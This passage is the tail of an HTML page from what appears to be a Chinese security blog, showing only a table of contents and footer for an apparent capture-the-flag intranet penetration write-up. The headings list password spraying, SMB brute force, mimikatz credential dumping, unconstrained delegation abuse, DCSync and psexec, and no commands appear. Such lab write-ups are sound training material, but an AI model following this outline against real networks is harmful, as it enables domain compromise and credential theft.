href="#%E5%86%85%E7%BD%91"><span class="toc-article-text">内网</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E7%BD%91%E7%BD%91%E6%AE%B5"><span class="toc-article-text">查看内网网段</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fscan%E5%A4%A7%E4%BF%9D%E5%81%A5"><span class="toc-article-text">fscan大保健</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95-AS-REP-Roasting%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">尝试 AS-REP Roasting（失败）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-article-text">密码喷洒</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8B%BF%E4%B8%8B-XIAORANG-WIN19-172-22-4-45%EF%BC%9Asmb%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-article-text">拿下 XIAORANG\WIN19 172.22.4.45：smb密码爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E8%BF%87%E6%9C%9F%E9%97%AE%E9%A2%98"><span class="toc-article-text">密码过期问题</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-article-text">信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%87%AD%E6%8D%AE%E6%90%9C%E9%9B%86"><span class="toc-article-text">凭据搜集</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-article-text">权限提升</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E6%8F%90%E6%9D%83%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">命名管道提权（失败）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#privescCheck"><span class="toc-article-text">privescCheck</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96flag02"><span class="toc-article-text">获取flag02</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#hashdump"><span class="toc-article-text">hashdump</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mimikatz-%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">mimikatz 抓取密码</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">域内信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85ACL"><span class="toc-article-text">域内ACL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E5%A7%94%E6%B4%BE"><span class="toc-article-text">域内委派</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-%E5%BC%BA%E5%88%B6%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-article-text">非约束委派+强制身份认证</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mimikatz-dcsync"><span class="toc-article-text">mimikatz dcsync</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#impackt-psexec"><span class="toc-article-text">impackt-psexec</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 X1NRI's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
